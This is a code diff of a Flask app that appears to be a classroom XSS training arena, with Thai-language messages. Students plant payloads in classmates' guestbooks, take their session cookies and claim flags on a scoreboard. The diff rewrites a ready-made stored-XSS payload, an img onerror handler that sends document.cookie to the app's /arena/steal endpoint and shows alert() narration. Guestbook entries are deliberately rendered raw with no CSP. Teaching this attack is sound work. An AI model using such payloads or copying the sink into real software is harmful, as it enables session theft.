@@ -396,9 +396,20 @@ _ARENA_GIF = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAA
 
 
 def arena_trap(by):
-    # ready-made beginner payload: when the victim views it, their cookie is sent to OUR loot.
-    return ("<img src=x onerror=\"this.onerror=null;this.src='/arena/steal?by=%s&c='"
-            "+encodeURIComponent(document.cookie)\">" % by)
+    # Teaching payload: it narrates itself with alert() at every step so the victim SEES what
+    # runs in their browser -- it proves XSS, reads document.cookie + location, then sends the
+    # cookie out with new Image().src (the classic exfiltration trick). No page navigation.
+    # IMPORTANT: no double-quotes (") anywhere inside -- they would close the onerror="" attribute
+    # and break the whole script. Send the cookie FIRST so the steal always happens even if the
+    # victim dismisses the dialogs, then narrate each step with alert().
+    steps = (
+        "new Image().src='/arena/steal?by=%s&c='+encodeURIComponent(document.cookie);"
+        "alert('① alert() ทำงาน = มี XSS! โค้ดที่เพื่อนแอบฝากไว้ กำลังรันในหน้าของคุณ');"
+        "alert('② document.cookie\\nโค้ดอ่าน cookie ของคุณได้:\\n'+document.cookie);"
+        "alert('③ location\\nโค้ดรู้ว่าคุณอยู่หน้าไหน:\\n'+location.href);"
+        "alert('④ new Image().src\\ncookie ของคุณถูกแอบส่งไปให้ %s ตั้งแต่ตอนเปิดหน้าแล้ว!')"
+    ) % (by, by)
+    return '<img src=x onerror="%s">' % steps
 
 
 def _arena_slug(s):
@@ -468,7 +479,7 @@ def arena_me():
     # This page does NOT render the guestbook raw, so the flag never sits next to the XSS sink.
     return render_template("arena_me.html", me=me, flag=ARENA_USERS[me]["flag"],
                            sig_count=len(GUESTBOOKS.get(me, [])), loot_count=len(LOOT.get(me, [])),
-                           users=sorted(ARENA_USERS))
+                           users=sorted(ARENA_USERS), planted=request.args.get("planted"))
 
 
 @app.route("/arena/u/<name>", methods=["GET", "POST"])
@@ -483,6 +494,8 @@ def arena_profile(name):
         GUESTBOOKS.setdefault(name, []).append({"author": arena_user(),
                                                 "body": request.form.get("body", "")})
         GUESTBOOKS[name] = GUESTBOOKS[name][-50:]   # cap the board
+        if request.form.get("kind") == "payload":   # planted a payload -> go home so it doesn't fire on US
+            return redirect("/arena/me?planted=%s" % name)
         return redirect("/arena/u/%s" % name)
     # NO CSP on this route -> guestbook body renders RAW = the stored-XSS sink.
     me = arena_user()
@@ -518,9 +531,9 @@ def arena_peek():
     m = re.search(r"arena_session=([0-9a-f]+)", request.form.get("cookie", ""))
     victim = ARENA_SESSIONS.get(m.group(1)) if m else None
     if not victim:
-        revealed = {"ok": False, "text": "ตั๋ว (cookie) นี้ใช้ไม่ได้/หมดอายุ — ลองขโมยใบใหม่"}
+        revealed = {"ok": False, "text": "cookie นี้ใช้ไม่ได้/หมดอายุแล้ว — ลองเก็บอันใหม่"}
     elif victim == me:
-        revealed = {"ok": False, "text": "นี่ cookie ของตัวเอง — ไปขโมยของเพื่อน!"}
+        revealed = {"ok": False, "text": "นี่ cookie ของตัวเอง — ไปเอาของเพื่อน!"}
     else:
         revealed = {"ok": True, "victim": victim, "flag": ARENA_USERS[victim]["flag"]}
     return render_template("arena_loot.html", me=me, loot=LOOT.get(me, []), revealed=revealed)
@@ -534,12 +547,12 @@ def arena_claim():
     stolen = (request.form.get("flag", "") or "").strip()
     victim = next((n for n, u in ARENA_USERS.items() if u["flag"] == stolen), None)
     if not victim:
-        msg = ("bad", "That is not a valid stolen flag.")
+        msg = ("bad", "นี่ไม่ใช่ flag ที่ถูกต้อง")
     elif victim == me:
-        msg = ("bad", "That is your OWN flag — steal a classmate's!")
+        msg = ("bad", "นี่ flag ของตัวเอง — ไปเอา cookie ของเพื่อน!")
     else:
         CLAIMS.setdefault(me, set()).add(victim)
-        msg = ("ok", "Pwned %s! Logged on the scoreboard." % victim)
+        msg = ("ok", "ได้ cookie ของ %s แล้ว! บันทึกขึ้นกระดานแล้ว 🍪" % victim)
     return render_template("arena_scoreboard.html", me=me, msg=msg,
                            board=sorted(((a, len(v)) for a, v in CLAIMS.items()), key=lambda x: -x[1]),
                            detail={a: sorted(v) for a, v in CLAIMS.items()})
